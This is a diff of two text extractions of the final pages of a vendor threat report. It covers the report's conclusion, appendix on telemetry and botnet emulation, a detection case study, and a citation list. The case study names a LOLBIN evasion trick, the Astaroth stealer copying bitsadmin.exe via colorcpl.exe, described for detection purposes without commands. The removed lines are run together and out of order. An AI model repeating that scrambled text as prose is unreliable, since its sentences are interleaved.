+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+07
+Conclusion
+One of the things that makes cybersecurity such a fascinating 
+and challenging field is the need to combat and stay one step 
+ahead of the continuing ingenuity of threat actors that this report 
+demonstrates. Sometimes their innovations are driven by law 
+enforcement activity, such as taking down criminal marketplaces and 
+forums, or by industry actions like Microsoft's disabling of macros 
+by default, or sometimes by political imperatives like China's desire 
+to frustrate detection of its cyberespionage activities. Often, they 
+are another step in the arms race between malicious actors and the 
+efforts of companies like Secureworks to create the detections and 
+countermeasures that power systems like Taegis and protect our 
+customers. Some events, like Microsoft's decision to disable macros, 
+force almost immediate change on the part of threat actors. Other 
+changes are more gradual.
+However, as fast as some threat actors are to innovate, many are 
+happy to continue doing what still works. CISA's annual roundup 
+of top routinely exploited vulnerabilities reinforces that point
+in 202276, threat actors exploited older software vulnerabilities 
+more frequently than newly discovered ones. This continues 
+to demonstrate the value of focusing on the cybersecurity 
+fundamentals alongside staying current on the latest exploits and 
+TTPs. 
+The advice we regularly provide to customers is as relevant as ever: 
+Identify your assets and their location on your network, stay up to 
+date with what is happening in the threat landscape, understand your 
+risk profile and use it to prioritize your control framework and your 
+approach to vulnerability management. Lockdown internet\-facing 
+systems and sensitive internal systems using fully implemented best\-
+practice MFA. Instrument your network to provide comprehensive 
+monitoring of all endpoint, network, and cloud resources. We 
+understand that these recommendations, simple as they are to make, 
+can sometimes be challenging to implement. However, working 
+closely with a trusted technology partner like Secureworks provides a 
+significant step forward in ensuring that your security practice keeps 
+you safe.
+70
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+08
+Appendix
+Taegis and the Secureworks View 
+of the Threat
+Secureworks' view of the threat landscape comes from a 
+combination of telemetry from the Taegis XDR and VDR platforms, 
+incident response and Secureworks Adversary Group customer 
+engagements, and technical and tactical research conducted by the 
+Counter Threat Unit. These inputs combine to produce high\-fidelity 
+visibility into threat actor intent, capability, and activity; and feed into 
+actionable intelligence what organizations need to do to reduce their 
+risk.
+In the 12 months from July 2022, the Secureworks Incident 
+Response team and Secureworks Counter Threat Unit 
+conducted 1,300\+ incident response engagements, across 
+a wide spectrum of industry sectors.
+Secureworks processes over 1\.8 trillion event logs a 
+week, or around 610 billion logs every single working day, 
+gathered from security infrastructure in thousands of 
+customer environments around the world.
+CTU researchers gather and analyze data from internally 
+generated and externally collected telemetry, from multiple 
+sources including publicly available information, dark 
+web forums, proprietary botnet emulation systems, and 
+intelligence relationships.
+This data combines to illustrate threat actor behavior, revealing both 
+high\-level tactics and the technical details about their tooling. It 
+feeds the threat intelligence products published every week by the 
+CTU, and the unified Rosetta Stone that relates our threat groups to 
+the naming conventions used by other TI providers. 
+It also produces inputs for the repository of knowledge that drives 
+the elite threat detection and integrated response actions that Taegis 
+delivers. Other inputs include threat actor emulation and botnet 
+emulation.
+100\+ CTU Researchers Gather Data from:
+IR Engagements
+Event Logs a Week
+1,300\+
+1\.8 Trillion\+
+
+Internally Generated
 Externally Collected 
-TelemetryPublicly
+Telemetry
+Publicly
 Available
-InformationIntelligence 
-Relationships2023 State of the Threat: A Year in Review7001Letter From Our VPThreat Actor EmulationFeeding 
-the Virtuous Circle Within Taegisbefore they can cause significant harm to customers. This allowsus to adopt a strategic defensive stance, better safeguarding theprivacy and security of our clients and partners.Executive Summaryand Key FindingsEmulating offensive tools and techniques within a secure andcontrolled environment allows CTU researchers to immerseThe result is a more resilient cybersecurity infrastructure thatsafeguards our customers' and partners' critical assets and data andthemselves in the mindset of threat actors, creating valuable insightsfeeds back into our threat intelligence.into their methodologies and strategies.0203The Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07ConclusionTaegis is at the core of this endeavor, tracking and monitoringactivity on our test systems throughout the emulated attacks. Theplatform captures system telemetry and performs near\-real\-timeanalysis of the data. As we closely monitor these emulated attacks,we make context\-aware adjustments to our defense strategies,fortifying potential weak points identified during testing. Thisadaptive approach helps us to keep up with changes in the threatlandscape and proactively strengthens the platform's capabilities.The Value of Botnet EmulationThe CTU botnet emulator system allows our researchersto maintain real\-time situational awareness ofcybercriminal threats through perpetual automatedengagement with threat actor infrastructure.Direct participation in a botnet provides an opportunity fornear\-immediate discovery of new infrastructure, protocolThreat emulation also provides additional experience in counteringchanges, and delivered commands and payloads as wella wide array of cyber threats, and helps refine real\-time threatas monitoring the botnet's availability. These interactionsdetection, defensive measures, incident response, and vulnerabilityare not dictated by a malware's normal execution controlmitigation.It also fosters a culture of continuous improvement within ourteam. Regular debriefings and comprehensive post\-mortemanalyses after each emulation provide the opportunity to identifyand address shortcomings or potential blind spots in our defenseflow and instead allow for systematic interrogation thatcan extract more information from C2 servers than undernormal circumstances.Direct communication with attacker infrastructure alsoallows us to publish indicators at high confidence levels.Previously this type of information had to be gatheredpassively through client telemetry or observation ofimprovements to the platform, ensuring that our defense strategiessandbox detonations which provide an incomplete picture.evolve alongside the ever\-changing threat landscape.By maintaining a proactive approach to understanding offensivetools and techniques, we are better equipped to anticipate threats2023 State of the Threat: A Year in Review7108Appendixmechanisms. The lessons learned are then incorporated into ongoing01Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixThe Taegis Intelligence to 
-Protection Pipeline in ActionAn open\-source report77 about the GuildmaAstaroth stealer ledone of our researchers to request countermeasure creation, leadingto the detection of similar activity in customer environments. Thereport detailed how Astaroth was observed abusing the colorcpl.exe LOLBIN to copy bitsadmin.exe into a non\-standard directory 'c:windowssystem32spooldriverscolor. This was likely to bypasssecurity controls that detect the abuse of bitsadmin.exe executed onits original folder.Reviewing our telemetry revealed events showing Astaroth activityin a customer environment, and a high severity alert generated forthe client for an AppLocker Bypass Process run from System32spooldriverscolor. Because there was no alert for the copying ofbitsadmin.exe into the non\-standard directory, our researcher raiseda countermeasure request to identify future occurrences of thismalicious activity.The resulting countermeasure alerted on similar malicious processexecutions in another customer's environment. Secureworksescalated the incident to the customer via a high\-severityinvestigation and incident response was invoked.Figure 34\. Bitsadmin.exe events in a customer environment.
-(Source: Secureworks.)2023 State of the Threat: A Year in Review72123456789101112132022 State of the Threat: A Year in Review,
+Information
+Intelligence 
+Relationships
+71
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Threat Actor EmulationFeeding 
+the Virtuous Circle Within Taegis
+Emulating offensive tools and techniques within a secure and 
+controlled environment allows CTU researchers to immerse 
+themselves in the mindset of threat actors, creating valuable insights 
+into their methodologies and strategies.
+Taegis is at the core of this endeavor, tracking and monitoring 
+activity on our test systems throughout the emulated attacks. The 
+platform captures system telemetry and performs near\-real\-time 
+analysis of the data. As we closely monitor these emulated attacks, 
+we make context\-aware adjustments to our defense strategies, 
+fortifying potential weak points identified during testing. This 
+adaptive approach helps us to keep up with changes in the threat 
+landscape and proactively strengthens the platform's capabilities.
+Threat emulation also provides additional experience in countering 
+a wide array of cyber threats, and helps refine real\-time threat 
+detection, defensive measures, incident response, and vulnerability 
+mitigation. 
+It also fosters a culture of continuous improvement within our 
+team. Regular debriefings and comprehensive post\-mortem 
+analyses after each emulation provide the opportunity to identify 
+and address shortcomings or potential blind spots in our defense 
+mechanisms. The lessons learned are then incorporated into ongoing 
+improvements to the platform, ensuring that our defense strategies 
+evolve alongside the ever\-changing threat landscape.
+By maintaining a proactive approach to understanding offensive 
+tools and techniques, we are better equipped to anticipate threats 
+before they can cause significant harm to customers. This allows 
+us to adopt a strategic defensive stance, better safeguarding the 
+privacy and security of our clients and partners. 
+The result is a more resilient cybersecurity infrastructure that 
+safeguards our customers' and partners' critical assets and data and 
+feeds back into our threat intelligence.
+The Value of Botnet Emulation
+The CTU botnet emulator system allows our researchers 
+to maintain real\-time situational awareness of 
+cybercriminal threats through perpetual automated 
+engagement with threat actor infrastructure.
+Direct participation in a botnet provides an opportunity for 
+near\-immediate discovery of new infrastructure, protocol 
+changes, and delivered commands and payloads as well 
+as monitoring the botnet's availability. These interactions 
+are not dictated by a malware's normal execution control 
+flow and instead allow for systematic interrogation that 
+can extract more information from C2 servers than under 
+normal circumstances. 
+Direct communication with attacker infrastructure also 
+allows us to publish indicators at high confidence levels. 
+Previously this type of information had to be gathered 
+passively through client telemetry or observation of 
+sandbox detonations which provide an incomplete picture.
+72
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+The Taegis Intelligence to 
+Protection Pipeline in Action
+An open\-source report77 about the GuildmaAstaroth stealer led 
+one of our researchers to request countermeasure creation, leading 
+to the detection of similar activity in customer environments. The 
+report detailed how Astaroth was observed abusing the colorcpl.
+exe LOLBIN to copy bitsadmin.exe into a non\-standard directory 'c:
+windowssystem32spooldriverscolor. This was likely to bypass 
+security controls that detect the abuse of bitsadmin.exe executed on 
+its original folder.
+Reviewing our telemetry revealed events showing Astaroth activity 
+in a customer environment, and a high severity alert generated for 
+the client for an AppLocker Bypass Process run from System32
+spooldriverscolor. Because there was no alert for the copying of 
+bitsadmin.exe into the non\-standard directory, our researcher raised 
+a countermeasure request to identify future occurrences of this 
+malicious activity.
+The resulting countermeasure alerted on similar malicious process 
+executions in another customer's environment. Secureworks 
+escalated the incident to the customer via a high\-severity 
+investigation and incident response was invoked.
+Figure 34\. Bitsadmin.exe events in a customer environment.
+(Source: Secureworks.)
+1
+2022 State of the Threat: A Year in Review,
 https:www.secureworks.comresourcesrp\-state\-of\-the\-
-threat\-2022, 922\.Secureworks threat profiles,
-https:www.secureworks.comresearchthreat\-profilesMalasLocker ransomware targets Zimbra servers, 
+threat\-2022, 922\.
+2 
+Secureworks threat profiles,
+https:www.secureworks.comresearchthreat\-profiles
+3 
+MalasLocker ransomware targets Zimbra servers, 
 demands charity donation, https:www.bleepingcomputer.
 comnewssecuritymalaslocker\-ransomware\-targets\-
-zimbra\-servers\-demands\-charity\-donation, 51723\.Ransomware Revenue Down As More Victims Refuse 
+zimbra\-servers\-demands\-charity\-donation, 51723\.
+4 
+Ransomware Revenue Down As More Victims Refuse 
 to Pay, https:blog.chainalysis.comreportscrypto\-
 ransomware\-revenue\-down\-as\-victims\-refuse\-to\-pay, 
-11923\.Infostealer Market Booming, Despite Genesis Market and 
+1\. 5 
+Infostealer Market Booming, Despite Genesis Market and 
 RaidForums Takedowns, https:www.secureworks.com
 aboutpressinfostealer\-market\-booming\-despite\-genesis\-
-market\-and\-raidforums\-takedowns, 51623\.BRONZE STARLIGHT RANSOMWARE OPERATIONS USE 
+market\-and\-raidforums\-takedowns, 51623\.
+6 
+BRONZE STARLIGHT RANSOMWARE OPERATIONS USE 
 HUI LOADER, https:www.secureworks.comresearch
 bronze\-starlight\-ransomware\-operations\-use\-hui\-loader, 
-62322\.CISA, NSA, FBI, and International Partners Release Joint 
+1\. 7 
+CISA, NSA, FBI, and International Partners Release Joint 
 CSA on Top Routinely Exploited Vulnerabilities of 2022, 
 https:www.cisa.govnews\-eventsalerts20230803cisa\-
 nsa\-fbi\-and\-international\-partners\-release\-joint\-csa\-top\-
-routinely\-exploited\-vulnerabilities, 8323\.BA, BBC and Boots hit by cyber security breach with 
+routinely\-exploited\-vulnerabilities, 8323\.
+8 
+BA, BBC and Boots hit by cyber security breach with 
 contact and bank details exposed, https:news.sky.
 comstorybas\-uk\-staff\-exposed\-to\-global\-data\-theft\-
-spree\-12896900, 6523\.Reward Offers for Information to Bring Conti 
+spree\-12896900, 6523\.
+9 
+Reward Offers for Information to Bring Conti 
 Ransomware Variant Co\-Conspirators to Justice, https:
 www.state.govreward\-offers\-for\-information\-to\-bring\-
 conti\-ransomware\-variant\-co\-conspirators\-to\-justice, 
-5623\.Ransomware Revenue Down As More Victims Refuse 
+1\. 10 
+Ransomware Revenue Down As More Victims Refuse 
 to Pay, https:blog.chainalysis.comreportscrypto\-
 ransomware\-revenue\-down\-as\-victims\-refuse\-to\-pay, 
-11923\.ITG23 Crypters Highlight Cooperation Between 
+1\. 11 
+ITG23 Crypters Highlight Cooperation Between 
 Cybercriminal Groups, https:securityintelligence.com
 postsitg23\-crypters\-cooperation\-between\-cybercriminal\-
-groups, 51923\.Recovery of Colonial Pipeline ransom funds highlights 
+groups, 51923\. 
+12 
+Recovery of Colonial Pipeline ransom funds highlights 
 traceability of cryptocurrency, experts say, https:www.
 thomsonreuters.comen\-uspostsinvestigation\-fraud\-and\-
-riskcolonial\-pipeline\-ransom\-funds, 62321\.Ransomware criminals sanctioned in joint UKUS 
+riskcolonial\-pipeline\-ransom\-funds, 62321\.
+13 
+Ransomware criminals sanctioned in joint UKUS 
 crackdown on international cyber crime, https:www.
 nationalcrimeagency.gov.uknewsransomware\-criminals\-
 sanctioned\-in\-joint\-uk\-us\-crackdown\-on\-international\-
-cyber\-crime, 2923\.1415161718192021222324252627U.S. Department of Justice Disrupts Hive Ransomware 
+cyber\-crime, 2923\.
+14 
+U.S. Department of Justice Disrupts Hive Ransomware 
 Variant, https:www.justice.govopaprus\-department\-
-justice\-disrupts\-hive\-ransomware\-variant, 12623\.Exclusive: US government agencies hit in global 
+justice\-disrupts\-hive\-ransomware\-variant, 12623\.
+15 
+Exclusive: US government agencies hit in global 
 cyberattack, https:edition.cnn.com20230615politics
-us\-government\-hit\-cybeattackindex.html, 61523\.Royal Mail cyberattack linked to LockBit ransomware 
+us\-government\-hit\-cybeattackindex.html, 61523\.
+16 
+Royal Mail cyberattack linked to LockBit ransomware 
 operation, https:www.bleepingcomputer.comnews
 securityroyal\-mail\-cyberattack\-linked\-to\-lockbit\-
-ransomware\-operation, 11223\.Authorities Warn Health Sector of Attacks by Rhysida 
+ransomware\-operation, 11223\. 
+17 
+Authorities Warn Health Sector of Attacks by Rhysida 
 Group, https:www.bankinfosecurity.comauthorities\-
 warn\-health\-sector\-attacks\-by\-rhysida\-group\-a\-22753, 
-8723\.Babuk Source Code Sparks 9 Different Ransomware 
+1\. 18 
+Babuk Source Code Sparks 9 Different Ransomware 
 Strains Targeting VMware ESXi Systems, https:
 thehackernews.com202305babuk\-source\-code\-sparks\-
-9\-new.html, 51123\.Massive ESXiArgs ransomware attack targets VMware 
+9\-new.html, 51123\. 
+19 
+Massive ESXiArgs ransomware attack targets VMware 
 ESXi servers worldwide, https:www.bleepingcomputer.
 comnewssecuritymassive\-esxiargs\-ransomware\-attack\-
-targets\-vmware\-esxi\-servers\-worldwide, 2323\.Critical Infrastructure Sectors, https:www.cisa.gov
+targets\-vmware\-esxi\-servers\-worldwide, 2323\.
+20 
+Critical Infrastructure Sectors, https:www.cisa.gov
 topicscritical\-infrastructure\-security\-and\-resilience
-critical\-infrastructure\-sectors, accessed 81823\.What effects have sanctions had on the Russian 
+critical\-infrastructure\-sectors, accessed 81823\. 
+21 
+What effects have sanctions had on the Russian 
 economy? https:www.weforum.orgagenda202212
-sanctions\-russian\-economy\-effects, 122222\.United States v. Conor Brian Fitzpatrick, https:www.
+sanctions\-russian\-economy\-effects, 122222\.
+22 
+United States v. Conor Brian Fitzpatrick, https:www.
 justice.govusao\-edvaunited\-states\-v\-conor\-brian\-
-fitzpatrick, Updated 62023\.BreachForums owner Pompompurin pleads guilty to 
+fitzpatrick, Updated 62023\.
+23 
+BreachForums owner Pompompurin pleads guilty to 
 hacking charges, https:www.bleepingcomputer.com
 newssecuritybreachforums\-owner\-pompompurin\-pleads\-
-guilty\-to\-hacking\-charges, 71423\.U.S. Department of Justice Disrupts Hive Ransomware 
+guilty\-to\-hacking\-charges, 71423\.
+24 
+U.S. Department of Justice Disrupts Hive Ransomware 
 Variant, https:www.justice.govopaprus\-department\-
-justice\-disrupts\-hive\-ransomware\-variant, 12623\.Cuba ransomware believed to be Russian state\-backed 
+justice\-disrupts\-hive\-ransomware\-variant, 12623\.
+25 
+Cuba ransomware believed to be Russian state\-backed 
 operation, https:www.scmagazine.combriefthreat\-
 intelligencecuba\-ransomware\-believed\-to\-be\-russian\-
-state\-backed\-operation, 51723\.RomCom malware spread via Google Ads for ChatGPT, 
+state\-backed\-operation, 51723\.
+26 
+RomCom malware spread via Google Ads for ChatGPT, 
 GIMP, more, https:www.bleepingcomputer.comnews
 securityromcom\-malware\-spread\-via\-google\-ads\-for\-
-chatgpt\-gimp\-more, 53023\.Cyber attack on state organizations of Ukraine using 
+chatgpt\-gimp\-more, 53023\.
+27 
+Cyber attack on state organizations of Ukraine using 
 RomCom malware. Possible involvement of Cuba 
 Ransomware aka Tropical Scorpius aka UNC2596 (CERT\-
-UA\#5509\), https:cert.gov.uaarticle2394117, 102222\.282930313233343536373839Hello Ransomware Uses Updated China Chopper Web 
+UA\#5509\), https:cert.gov.uaarticle2394117, 102222\.
+28 
+Hello Ransomware Uses Updated China Chopper Web 
 Shell, SharePoint Vulnerability, https:www.trendmicro.
 comen\_usresearch21dhello\-ransomware\-uses\-
 updated\-china\-chopper\-web\-shell\-sharepoint\-vulnerability.
-html, 42721\.Seven International Cyber Defendants, Including Apt41 
+html, 42721\.
+29 
+Seven International Cyber Defendants, Including Apt41 
 Actors, Charged In Connection With Computer Intrusion 
 Campaigns Against More Than 100 Victims Globally, 
 https:www.justice.govopaprseven\-international\-cyber\-
 defendants\-including\-apt41\-actors\-charged\-connection\-
-computer, 91620\.OPSEC MISTAKES REVEAL COBALT MIRAGE THREAT 
+computer, 91620\.
+30 
+OPSEC MISTAKES REVEAL COBALT MIRAGE THREAT 
 ACTORS, https:www.secureworks.comblogopsec\-
-mistakes\-reveal\-cobalt\-mirage\-threat\-actors, 91422\.Three Iranian Nationals Charged with Engaging in 
+mistakes\-reveal\-cobalt\-mirage\-threat\-actors, 91422\.
+31 
+Three Iranian Nationals Charged with Engaging in 
 Computer Intrusions and Ransomware\-Style Extortion 
 Against U.S. Critical Infrastructure Providers, https:
 www.justice.govopaprthree\-iranian\-nationals\-charged\-
 engaging\-computer\-intrusions\-and\-ransomware\-style\-
-extortion, 91422\.Treasury Sanctions IRGC\-Affiliated Cyber Actors for 
+extortion, 91422\.
+32 
+Treasury Sanctions IRGC\-Affiliated Cyber Actors for 
 Roles in Ransomware Activity, https:home.treasury.gov
-newspress\-releasesjy0948, 91422\.Internet Crime Report 2022, https:www.ic3\.govMedia
-PDFAnnualReport2022\_IC3Report.pdf, 31323\.Macros from the internet will be blocked by default in 
+newspress\-releasesjy0948, 91422\.
+33 
+Internet Crime Report 2022, https:www.ic3\.govMedia
+PDFAnnualReport2022\_IC3Report.pdf, 31323\.
+34 
+Macros from the internet will be blocked by default in 
 Office, https:learn.microsoft.comen\-usdeployoffice
-securityinternet\-macros\-blocked, 22823\.DARKTORTILLA MALWARE ANALYSIS, https:www.
+securityinternet\-macros\-blocked, 22823\.
+35 
+DARKTORTILLA MALWARE ANALYSIS, https:www.
 secureworks.comresearchdarktortilla\-malware\-analysis, 
-81722\.Qakbot Malware Disrupted in International Cyber 
+1\. 36 
+Qakbot Malware Disrupted in International Cyber 
 Takedown, https:www.justice.govusao\-cdcaprqakbot\-
-malware\-disrupted\-international\-cyber\-takedown, 82923\.Gootloader malware updated with PowerShell, sneaky 
+malware\-disrupted\-international\-cyber\-takedown, 82923\.
+37 
+Gootloader malware updated with PowerShell, sneaky 
 JavaScript, https:www.theregister.com20230130
-gootloader\_mandiant\_malware, 13023\.Healthcare Sector Warned About Increase in GootLoader 
+gootloader\_mandiant\_malware, 13023\.
+38 
+Healthcare Sector Warned About Increase in GootLoader 
 Malware Infections, https:www.hipaajournal.com
 healthcare\-sector\-warned\-about\-increase\-in\-gootloader\-
-malware\-infections, 21523\.Use Microsoft Purview Audit (Premium) to investigate 
+malware\-infections, 21523\.
+39 
+Use Microsoft Purview Audit (Premium) to investigate 
 compromised accounts, https:learn.microsoft.com
 en\-uspurviewaudit\-log\-investigate\-accounts?view\=o365\-
-worldwide, 72123\.40Obfuscated Files or Information: HTML Smuggling, 
+worldwide, 72123\.
+40 
+Obfuscated Files or Information: HTML Smuggling, 
 https:attack.mitre.orgtechniquesT1027006, accessed 
-81823\.41The Abraham Accords, https:www.state.govthe\-
-abraham\-accords, 91520\.2023 State of the Threat: A Year in Review73717273747576Supply\-chain attack on 3CX clients, https:www.
-kaspersky.comblogsupply\-chain\-attack\-on\-3cx47698, 
-33023\.3CX Software Supply Chain Compromise Initiated by a 
-Prior Software Supply Chain Compromise; Suspected 
-North Korean Actor Responsible, https:www.mandiant.
-comresourcesblog3cx\-software\-supply\-chain\-
-compromise, 42723\.North Korean Lazarus Hacking Group Leverages Supply 
-Chain Attacks To Distribute Malware for Cyber Espionage, 
-https:www.cpomagazine.comcyber\-securitynorth\-
-korean\-lazarus\-hacking\-group\-leverages\-supply\-chain\-
-attacks\-to\-distribute\-malware\-for\-cyber\-espionage, 
-11521\.North Korea's Lazarus Group Turns to Supply Chain 
-Attacks, https:www.darkreading.comthreat\-intelligence
-north\-korea\-s\-lazarus\-group\-turns\-to\-supply\-chain\-attacks, 
-102621\.ChatGPT just created malware, and that's seriously 
-scary, https:www.digitaltrends.comcomputingchatgpt\-
-created\-malware, 4723\.CISA, NSA, FBI, and International Partners Release Joint 
-CSA on Top Routinely Exploited Vulnerabilities of 2022, 
-https:www.cisa.govnews\-eventsalerts20230803cisa\-
-nsa\-fbi\-and\-international\-partners\-release\-joint\-csa\-top\-
-routinely\-exploited\-vulnerabilities, 8323\.77Guildma is now abusing colorcpl.exe LOLBIN, https:isc.
-sans.edudiaryrss29814, 5523\.4243444546474849505152535455OPSEC MISTAKES REVEAL COBALT MIRAGE THREAT 
+1\. 41 
+The Abraham Accords, https:www.state.govthe\-
+abraham\-accords, 91520\.
+73
+2023 State of the Threat: A Year in Review
+42 
+OPSEC MISTAKES REVEAL COBALT MIRAGE THREAT 
 ACTORS, https:www.secureworks.comblogopsec\-
-mistakes\-reveal\-cobalt\-mirage\-threat\-actors, 91422\.Iran's Widening Crackdown Pressures Rouhani, https:
+mistakes\-reveal\-cobalt\-mirage\-threat\-actors, 91422\.
+43 
+Iran's Widening Crackdown Pressures Rouhani, https:
 www.washingtoninstitute.orgpolicy\-analysisirans\-
-widening\-crackdown\-pressures\-rouhani, 112515\.Seven Iranians Working for Islamic Revolutionary Guard 
+widening\-crackdown\-pressures\-rouhani, 112515\.
+44 
+Seven Iranians Working for Islamic Revolutionary Guard 
 Corps\-Affiliated Entities Charged for Conducting 
 Coordinated Campaign of Cyber Attacks Against 
 U.S. Financial Sector, https:www.justice.govopapr
 seven\-iranians\-working\-islamic\-revolutionary\-guard\-corps\-
-affiliated\-entities\-charged, 32416\.Treasury Sanctions Iranian Organizations and Individuals 
+affiliated\-entities\-charged, 32416\.
+45 
+Treasury Sanctions Iranian Organizations and Individuals 
 Supporting Intelligence and Cyber Targeting of U.S. 
 Persons, https:home.treasury.govnewspress\-releases
-sm611, 21319\.Treasury Sanctions Cyber Actors Backed by Iranian 
+sm611, 21319\.
+46 
+Treasury Sanctions Cyber Actors Backed by Iranian 
 Intelligence Ministry, https:home.treasury.govnews
-press\-releasessm1127, 91720\.Treasury Sanctions Iranian Officials and Entities 
+press\-releasessm1127, 91720\.
+47 
+Treasury Sanctions Iranian Officials and Entities 
 Responsible for Ongoing Crackdown on Protests and 
 Internet Censorship, https:home.treasury.govnews
-press\-releasesjy1048, 102622\.Iranian intel cyber suite of malware uses open 
+press\-releasesjy1048, 102622\.
+48 
+Iranian intel cyber suite of malware uses open 
 source tools, https:www.cybercom.milMediaNews
 Article2897570iranian\-intel\-cyber\-suite\-of\-malware\-uses\-
-open\-source\-tools, 11222\.Acting Manhattan U.S. Attorney Announces Charges 
+open\-source\-tools, 11222\.
+49 
+Acting Manhattan U.S. Attorney Announces Charges 
 Against Iranian National For Conducting Cyber Attack 
 And $6 Million Extortion Scheme Against HBO, https:
 www.justice.govusao\-sdnypracting\-manhattan\-us\-
 attorney\-announces\-charges\-against\-iranian\-national\-
-conducting, 112117\.MOST WANTED: BEHZAD MESRI, https:www.fbi.gov
-wantedcybercopy\_of\_behzad\-mesri, 21319\.Treasury Sanctions Iranian Organizations and Individuals 
+conducting, 112117\.
+50 
+MOST WANTED: BEHZAD MESRI, https:www.fbi.gov
+wantedcybercopy\_of\_behzad\-mesri, 21319\.
+51 
+Treasury Sanctions Iranian Organizations and Individuals 
 Supporting Intelligence and Cyber Targeting of U.S. 
 Persons, https:home.treasury.govnewspress\-releases
-sm611, 21319\.Emennet Pasargad, https:rewardsforjustice.netrewards
-emennet\-pasargad, undated.Charming Kitten: Can We Have A Meeting https:
+sm611, 21319\.
+52 
+Emennet Pasargad, https:rewardsforjustice.netrewards
+emennet\-pasargad, undated.
+53 
+Charming Kitten: Can We Have A Meeting https:
 blog.certfa.compostscharming\-kitten\-can\-we\-wave\-a\-
-meeting, 9822\.COBALT ILLUSION MASQUERADES AS ATLANTIC 
+meeting, 9822\.
+54 
+COBALT ILLUSION MASQUERADES AS ATLANTIC 
 COUNCIL EMPLOYEE, https:www.secureworks.comblog
 cobalt\-illusion\-masquerades\-as\-atlantic\-council\-employee, 
-3923\.2021 STATE OF THE THREAT REPORT, https:www.
+1\. 55 
+2021 STATE OF THE THREAT REPORT, https:www.
 secureworks.comresourcesrp\-state\-of\-the\-threat\-2021, 
-921\.565758596061626364656667686970ABRAHAM'S AX LIKELY LINKED TO MOSES STAFF, 
+1\. 56 
+ABRAHAM'S AX LIKELY LINKED TO MOSES STAFF, 
 https:www.secureworks.comblogabrahams\-ax\-likely\-
-linked\-to\-moses\-staff, 12623\.Treasury Sanctions Iran Cyber Actors for Attempting 
+linked\-to\-moses\-staff, 12623\.
+57 
+Treasury Sanctions Iran Cyber Actors for Attempting 
 to Influence the 2020 U.S. Presidential Election, https:
-home.treasury.govnewspress\-releasesjy0494, 111821\.Predatory Sparrow: Who are the hackers who say they 
+home.treasury.govnewspress\-releasesjy0494, 111821\.
+58 
+Predatory Sparrow: Who are the hackers who say they 
 started a fire in Iran? https:www.bbc.co.uknews
-technology\-62072480, 71122\.Predatory Sparrow operation against Iranian steel maker 
+technology\-62072480, 71122\.
+59 
+Predatory Sparrow operation against Iranian steel maker 
 (2022\), https:cyberlaw.ccdcoe.orgwikiPredatory\_
 Sparrow\_operation\_against\_Iranian\_steel\_maker\_(2022\), 
-81722\.Treasury Sanctions Iranian Ministry of Intelligence 
+1\. 60 
+Treasury Sanctions Iranian Ministry of Intelligence 
 and Minister for Malign Cyber Activities, https:home.
-treasury.govnewspress\-releasesjy0941, 9922\.Cybercriminals attempt to attack Ukrainian governmental 
+treasury.govnewspress\-releasesjy0941, 9922\.
+61 
+Cybercriminals attempt to attack Ukrainian governmental 
 agencies with fake OS updates, https:cip.gov.ua
 ennewskiberzlovmisniki\-namagayutsya\-atakuvati\-
 derzhorgani\-ukrayini\-feikovimi\-onovlennyami\-operaciinoyi\-
-sistemi, 42923\.AppleJeus: Analysis of North Korea's Cryptocurrency 
+sistemi, 42923\.
+62 
+AppleJeus: Analysis of North Korea's Cryptocurrency 
 Malware, https:www.cisa.govnews\-eventscybersecurity\-
-advisoriesaa21\-048a, 41521\.North Korean crypto thefts target Japan, Vietnam, Hong 
+advisoriesaa21\-048a, 41521\.
+63 
+North Korean crypto thefts target Japan, Vietnam, Hong 
 Kong, https:asia.nikkei.comSpotlightCryptocurrencies
 North\-Korean\-crypto\-thefts\-target\-Japan\-Vietnam\-Hong\-
-Kong, 51523\.North Korea Exports, https:tradingeconomics.comnorth\-
-koreaexports, accessed 81823\.Operation AppleJeus: Lazarus hits cryptocurrency 
+Kong, 51523\.
+64 
+North Korea Exports, https:tradingeconomics.comnorth\-
+koreaexports, accessed 81823\.
+65 
+Operation AppleJeus: Lazarus hits cryptocurrency 
 exchange with fake installer and macOS malware, https:
-securelist.comoperation\-applejeus87553, 82318\.BlueNoroff APT group targets macOS with RustBucket 
+securelist.comoperation\-applejeus87553, 82318\.
+66 
+BlueNoroff APT group targets macOS with RustBucket 
 Malware, https:www.jamf.comblogbluenoroff\-apt\-
-targets\-macos\-rustbucket\-malware, 42123\.I see what you did there: A look at the CloudMensis 
+targets\-macos\-rustbucket\-malware, 42123\.
+67 
+I see what you did there: A look at the CloudMensis 
 macOS spyware, https:www.welivesecurity.
 com20220719i\-see\-what\-you\-did\-there\-look\-
-cloudmensis\-macos\-spyware, 71922\.TraderTraitor: North Korean State\-Sponsored APT Targets 
+cloudmensis\-macos\-spyware, 71922\.
+68 
+TraderTraitor: North Korean State\-Sponsored APT Targets 
 Blockchain Companies, https:www.cisa.govnews\-events
-cybersecurity\-advisoriesaa22\-108a, 42022\.Linux malware strengthens links between Lazarus and 
+cybersecurity\-advisoriesaa22\-108a, 42022\.
+69 
